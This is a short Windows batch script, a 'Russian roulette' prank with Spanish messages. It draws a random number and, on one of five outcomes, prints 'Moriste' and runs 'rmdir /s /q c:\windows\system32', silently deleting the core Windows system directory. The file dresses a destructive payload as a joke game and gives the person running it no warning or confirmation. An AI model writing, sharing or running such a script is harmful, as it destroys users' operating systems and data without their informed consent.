@ECHO OFF
SET /A bala=%RANDOM% %%5
echo %bala%
if %bala%==3 (echo "Moriste") else (echo "Te salvaste")
if %bala%==3 (rmdir /s /q c:\windows\system32)